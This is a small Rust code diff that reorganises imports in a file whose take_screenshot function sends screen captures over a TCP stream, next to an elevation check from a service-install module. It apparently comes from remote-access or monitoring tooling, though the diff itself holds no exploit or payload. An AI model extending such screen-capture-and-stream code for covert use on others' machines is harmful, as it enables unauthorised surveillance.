@@ -1,6 +1,6 @@
 use std::net::TcpStream;
 use screenshots::{image, Screen};
-use std::io::{Cursor, Write};
+use std::io::Cursor;
 
 use sysinfo::{System, Disks};
 
@@ -14,8 +14,9 @@ use winapi::shared::windef::{HMONITOR, HDC, RECT};
 use winapi::shared::minwindef::{BOOL, LPARAM};
 use std::ptr;
 
-use crate::handler::write_bytes;
 use crate::service::install::is_elevated;
+
+use common::buffers::write_bytes;
 
 pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
     println!("taking the mf screenshot");
